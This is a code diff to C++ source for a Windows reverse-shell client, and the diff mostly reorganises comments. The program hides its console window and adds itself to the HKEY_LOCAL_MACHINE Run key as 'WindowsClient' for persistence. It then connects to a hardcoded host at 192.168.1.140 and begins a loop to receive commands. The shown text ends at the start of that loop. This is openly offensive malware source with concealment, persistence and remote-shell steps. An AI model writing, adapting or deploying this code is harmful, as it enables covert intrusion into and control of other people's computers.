@@ -12,7 +12,10 @@ const char szHost[] = "192.168.1.140";
 
 int main(const int argc, const char* argv[]){
 	// === Do some typical stuff, hide the console and do some registry editing
-    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the window
+    // == Hide the console window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    // == Add self into run reg key - ensures some persistence
+    // = Open the run key
 	HKEY hKey;
     LONG lResult = RegOpenKeyEx(
         HKEY_LOCAL_MACHINE,
@@ -21,8 +24,10 @@ int main(const int argc, const char* argv[]){
         KEY_WRITE,
         &hKey
     ); /* wont bother handling errors */
+    // = Get the path of the executable in its current location
     char szPath[MAX_PATH];
     DWORD dwSize = GetModuleFileName(NULL, szPath, MAX_PATH);
+    // = Edit the run key
 	lResult = RegSetValueEx(
 		hKey,
 		TEXT("WindowsClient"),
@@ -30,40 +35,43 @@ int main(const int argc, const char* argv[]){
 		REG_SZ,
 		(BYTE*)szPath,
 		dwSize
-	); /* wont bother handling errors */
+	);
+    // = Close the run key
 	RegCloseKey(hKey);
-
-    // Initialise winsock
+    
+    // === Connect to the server
+    // == Init winsock
     WSAData wsaData;
     WORD DllVersion = MAKEWORD(2, 1);
     if(WSAStartup(DllVersion, &wsaData) != 0){ // Initiate use of the winsock DLL
         ExitProcess(EXIT_FAILURE);
     }
 
-    // Create socket
+    // == Create socket
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
     if(!sock){
         ExitProcess(EXIT_FAILURE);
     }
 
-    // Get server info
+    // == Get server info
     HOSTENT* host = gethostbyname(szHost);
     if(host == nullptr){
         ExitProcess(EXIT_FAILURE);
     }
 
-    // Define server info
+    // == Define server info
     SOCKADDR_IN sin;
     ZeroMemory(&sin, sizeof(sin)); // Make sure the whole struct is set to 0
     sin.sin_port = htons(SERV_PORT);
     sin.sin_family = AF_INET;
     memcpy(&sin.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(sin.sin_addr.S_un.S_addr)); // Copy address into sin...S_addr
 
-    // Connect to the server
+    // == Connect to the server
     if(connect(sock, (const sockaddr*)&sin, sizeof(sin)) != 0){
         ExitProcess(EXIT_SUCCESS);
     }
 
+    // === Start actually doing fun reverse shell stuff!
     char szBuffer[1024]; // A buffer to receive commands on
     while(1){
         ZeroMemory(&szBuffer, sizeof(szBuffer));
